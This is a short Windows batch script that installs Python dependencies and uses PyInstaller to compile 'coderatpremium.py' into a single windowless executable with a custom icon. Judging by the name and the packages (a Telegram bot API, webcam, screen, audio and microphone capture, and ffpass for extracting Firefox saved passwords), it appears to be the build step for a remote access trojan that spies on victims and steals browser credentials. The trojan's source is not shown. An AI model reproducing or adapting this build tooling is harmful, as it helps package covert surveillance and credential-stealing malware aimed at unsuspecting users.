echo off

pip install --upgrade pip
pip install pyinstaller
pip install pyTelegramBotAPI
pip install requests
pip install opencv-python
pip install psutil
pip install GPUtil
pip install tabulate
pip install pycryptodome
pip install comtypes
pip install PyAutoGUI
pip install pycaw
pip install cryptography
pip install configparser
pip install Pillow
pip install pypiwin32
pip uninstall enum34
pip install wget
pip install cryptography
pip install configparser
pip install ffpass
pip install Pillow
pip install pypiwin32
pip install PyAudio-0.2.11-cp310-cp310-win_amd64.whl

pyinstaller -F -w -i test.ico coderatpremium.py


rmdir /s /q __pycache__
rmdir /s /q build

:cmd
pause null